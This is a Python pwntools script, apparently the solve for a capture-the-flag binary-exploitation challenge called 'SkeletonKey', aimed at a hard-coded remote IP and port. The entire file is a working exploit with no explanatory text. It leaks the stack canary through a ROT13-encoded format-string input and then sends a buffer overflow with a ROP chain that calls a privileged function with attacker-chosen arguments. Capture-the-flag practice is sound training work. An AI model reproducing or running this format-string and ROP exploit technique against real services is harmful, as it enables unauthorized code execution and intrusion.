#!/usr/bin/env python3
"""08 SkeletonKey: remote blind solve (pwntools + network only)."""
from pwn import *
import codecs
import re

HOST = '167.86.100.57'
PORT = 9008

POP_RDI  = 0x401820
POP_RSI  = 0x401822
RET      = 0x40101a
G_KEY    = 0x404098
SKELETON = 0x4015ff

context.arch = 'amd64'
context.log_level = 'error'

def enc(s):
    return codecs.encode(s, 'rot_13').encode()

io = remote(HOST, PORT)

io.recvuntil(b'UA:')
io.sendline(enc('%17$p'))
buf = io.recvuntil(b'PIN blob:')
canary = int(re.findall(rb'0x([0-9a-fA-F]+)', buf)[-1], 16)
assert canary & 0xff == 0

payload  = b'C' * 24
payload += p64(canary)
payload += p64(0)
payload += p64(RET)
payload += p64(POP_RDI) + p64(0x1337)
payload += p64(POP_RSI) + p64(G_KEY)
payload += p64(SKELETON)

io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
